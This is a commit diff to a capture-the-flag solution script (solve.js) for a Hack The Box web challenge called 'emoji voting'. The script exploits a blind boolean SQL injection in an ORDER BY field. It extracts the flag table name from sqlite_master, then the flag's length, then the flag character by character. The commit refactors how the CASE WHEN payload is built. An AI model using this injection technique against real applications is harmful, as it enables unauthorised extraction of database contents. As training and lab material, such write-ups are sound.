769d2cef5c8ecafe0cd780b15fd7fe9146c644d0
7Rocky <rockygitt@gmail.com>
2024-02-13 18:36:19 +0100

    Web/emoji voting

--- Challenges/Web/emoji voting/solve.js
+++ Challenges/Web/emoji voting/solve.js
@@ -3,9 +3,9 @@
 const BASE_URL = `http://${process.argv[2]}`
 const CHARS = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$?@_{}`
 
-const oracle = async order => {
+const oracle = async payload => {
   const res = await fetch(`${BASE_URL}/api/list`, {
-    body: JSON.stringify({ order }),
+    body: JSON.stringify({ order: `(CASE WHEN ${payload} THEN id ELSE count END)` }),
     headers: { 'Content-Type': 'application/json' },
     method: 'POST',
   })
@@ -19,7 +19,7 @@ const main = async () => {
 
   while (flagTableName.length !== 15) {
     for (let c of CHARS) {
-      if (await oracle(`(CASE WHEN (SELECT SUBSTR(tbl_name, ${flagTableName.length + 1}, 1) FROM sqlite_master WHERE tbl_name LIKE 'flag_%') = '${c}' THEN id ELSE count END)`)) {
+      if (await oracle(`(SELECT SUBSTR(tbl_name, ${flagTableName.length + 1}, 1) FROM sqlite_master WHERE tbl_name LIKE 'flag_%') = '${c}'`)) {
         flagTableName += c
         break
       }
@@ -30,17 +30,17 @@ const main = async () => {
 
   let flagLength = 1
 
-  while (await oracle(`(CASE WHEN (SELECT LENGTH(flag) FROM ${flagTableName}) != ${flagLength} THEN id ELSE count END)`)) {
+  while (await oracle(`(SELECT LENGTH(flag) FROM ${flagTableName}) != ${flagLength}`)) {
     flagLength++
   }
 
-  console.log('Flag length:', flagLength)
+  console.log(`Flag length: ${flagLength}`)
 
   let flag = 'HTB{'
 
   while (flag.length !== flagLength - 1) {
     for (let c of CHARS) {
-      if (await oracle(`(CASE WHEN (SELECT SUBSTR(flag, ${flag.length + 1}, 1) FROM ${flagTableName}) = '${c}' THEN id ELSE count END)`)) {
+      if (await oracle(`(SELECT SUBSTR(flag, ${flag.length + 1}, 1) FROM ${flagTableName}) = '${c}'`)) {
         flag += c
         break
       }
